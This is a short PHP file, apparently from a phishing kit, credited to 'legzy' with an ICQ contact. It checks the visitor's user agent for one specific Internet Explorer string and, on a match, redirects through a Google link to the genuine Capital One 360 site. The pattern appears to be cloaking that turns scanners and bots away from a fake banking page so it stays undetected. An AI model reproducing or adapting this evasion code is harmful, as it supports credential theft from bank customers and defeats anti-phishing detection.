<?php
/*
Created by legzy -- icq: 692561824 
*/
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {

        header("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCsQFjAAahUKEwi45Za9xYPJAhVCOYgKHenpCnY&url=https%3A%2F%2Fhome.capitalone360.com%2F&usg=AFQjCNHYI6r0p5QxSfkozqb7HsTTA93arg&sig2=ghwXVXK5zHPDomQXxPQGnA&bvm=bv.106923889,d.cWw");
		die();

}

?>